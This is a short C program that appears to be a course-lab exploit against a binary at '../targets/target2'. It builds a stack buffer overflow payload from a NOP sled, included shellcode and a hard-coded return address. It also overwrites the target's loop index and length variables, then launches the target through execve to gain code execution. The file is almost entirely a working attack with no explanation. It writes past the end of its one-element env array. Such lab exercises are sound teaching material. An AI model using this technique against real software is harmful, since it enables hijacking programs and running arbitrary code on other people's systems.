#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define BUF_SIZE 272

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char attack[BUF_SIZE];
	// buf at 0
	// i @ 264
	// len @ 268

    // next index 0
	strcpy(attack, "\x90");
	int i;
	for (i = 0; i < 206; i++)
        strcat(attack, "\x90");
    // next index 207

	strcat(attack, shellcode);
    // next index 252

    strcat(attack, "\x40\xfd\x21\x20");
    // next index 256

	for (i = 0; i < 8; i++)
        strcat(attack, "\x90");
    // next index 264 (i)

	strcat(attack, "\x0b\x01\x01\x01");
	// next index 268 (len)

	// overwrite value of len to 283
	strcat(attack, "\x1b\x01\x00\x00");

	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;

	env[0] = &attack[271];
	env[1] = &attack[244];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
